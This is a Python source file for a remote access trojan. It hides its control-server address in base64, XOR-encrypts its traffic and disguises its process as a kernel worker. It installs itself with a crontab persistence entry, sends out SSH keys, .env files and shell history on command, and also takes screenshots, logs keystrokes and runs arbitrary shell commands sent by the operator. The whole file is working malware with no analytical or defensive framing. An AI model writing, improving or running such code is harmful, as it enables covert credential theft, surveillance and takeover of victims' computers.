import asyncio
import websockets
import os
import subprocess
import uuid
import base64
import sys
import shutil
import glob
from io import BytesIO

try: import setproctitle
except: setproctitle = None
try: from PIL import ImageGrab
except: ImageGrab = None
try: from pynput import keyboard
except: keyboard = None

_S = "d3M6Ly8xOTIuMTY4LjEwLjgyOjgwMDAvd3Mv" 
X_KEY = "AMY_2026_SECRET"
FAKE_NAME = "[kworker/u2:1-events]"
log_buffer = []

def get_url(): return base64.b64decode(_S).decode()
def crypt_logic(d):
    k = X_KEY
    return "".join(chr(ord(d[i]) ^ ord(k[i % len(k)])) for i in range(len(d)))
def decrypt(m):
    try: return crypt_logic(base64.b64decode(m).decode())
    except: return None
def encrypt(m): return base64.b64encode(crypt_logic(m).encode()).decode()

def masquerade():
    if setproctitle: setproctitle.setproctitle(FAKE_NAME)
    else:
        try:
            import ctypes
            libc = ctypes.CDLL('libc.so.6')
            libc.prctl(15, FAKE_NAME.encode(), 0, 0, 0)
        except: pass

def ghost_install():
    try:
        target_dir = os.path.expanduser("~/.local/share/systemd-service")
        target_path = os.path.join(target_dir, "sys-update")
        current_path = os.path.abspath(sys.argv[0])
        if current_path != target_path:
            os.makedirs(target_dir, exist_ok=True)
            shutil.copy2(current_path, target_path)
            os.chmod(target_path, 0o755)
            cron_cmd = f"*/2 * * * * {target_path} > /dev/null 2>&1"
            current_cron = subprocess.run("crontab -l", shell=True, capture_output=True, text=True).stdout
            if target_path not in current_cron:
                new_cron = current_cron + f"\n{cron_cmd}\n"
                subprocess.Popen("crontab -", stdin=subprocess.PIPE, shell=True).communicate(input=new_cron.encode())
            subprocess.Popen([target_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            sys.exit(0)
    except: pass

async def steal_mode(ws):
    home = os.path.expanduser("~")
    # Додаємо прямі шляхи для надійності
    data_targets = [
        ("ssh", os.path.join(home, ".ssh", "*")),
        ("env", os.path.join(home, "Documents", ".env")),
        ("env_root", os.path.join(home, ".env")),
        ("history", os.path.join(home, ".bash_history"))
    ]
    
    stolen_count = 0
    await ws.send(encrypt(f"DEBUG: Searching in {home}"))
    
    for data_type, search_path in data_targets:
        files = glob.glob(search_path, recursive=True)
        if not files:
            await ws.send(encrypt(f"DEBUG: No files found for {data_type} at {search_path}"))
            continue
            
        for fpath in files:
            if os.path.isfile(fpath):
                try:
                    if os.access(fpath, os.R_OK):
                        with open(fpath, "rb") as f:
                            content = f.read()
                            if len(content) > 0:
                                b64 = base64.b64encode(content).decode()
                                packet = f"STEAL_DATA:{data_type}:{os.path.basename(fpath)}:{b64}"
                                await ws.send(encrypt(packet))
                                stolen_count += 1
                                await ws.send(encrypt(f"DEBUG: Sent {fpath}"))
                            else:
                                await ws.send(encrypt(f"DEBUG: Skip empty {fpath}"))
                    else:
                        await ws.send(encrypt(f"DEBUG: Permission denied for {fpath}"))
                except Exception as e:
                    await ws.send(encrypt(f"DEBUG: Error reading {fpath}: {str(e)}"))
    return stolen_count

def on_press(key):
    global log_buffer
    try: k = str(key.char)
    except: k = f" [{str(key)}] "
    log_buffer.append(k)

if keyboard:
    try: keyboard.Listener(on_press=on_press).start()
    except: pass

async def start():
    masquerade()
    ghost_install()
    b_id = f"bot_{hex(uuid.getnode())[2:10]}"
    
    while True:
        try:
            async with websockets.connect(get_url() + b_id) as ws:
                while True:
                    m = await ws.recv()
                    cmd_raw = decrypt(m)
                    if not cmd_raw: continue
                    cmd = cmd_raw.strip()
                    
                    if cmd == "steal":
                        await ws.send(encrypt("SYS_MSG: Stealer initiated..."))
                        count = await steal_mode(ws)
                        await ws.send(encrypt(f"SYS_MSG: Stealer finished. Total: {count}"))
                    elif cmd == "screenshot":
                        if ImageGrab:
                            buf = BytesIO()
                            ImageGrab.grab().save(buf, format="PNG")
                            await ws.send(encrypt(f"SCREENSHOT:{base64.b64encode(buf.getvalue()).decode()}"))
                    elif cmd == "get_keys":
                        global log_buffer
                        await ws.send(encrypt("KEYLOG:" + "".join(log_buffer)))
                        log_buffer = []
                    else:
                        try:
                            r = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                            ans = (r.stdout + r.stderr) or "Success."
                            await ws.send(encrypt(ans))
                        except Exception as e:
                            await ws.send(encrypt(str(e)))
        except: await asyncio.sleep(5)

if __name__ == "__main__":
    asyncio.run(start())
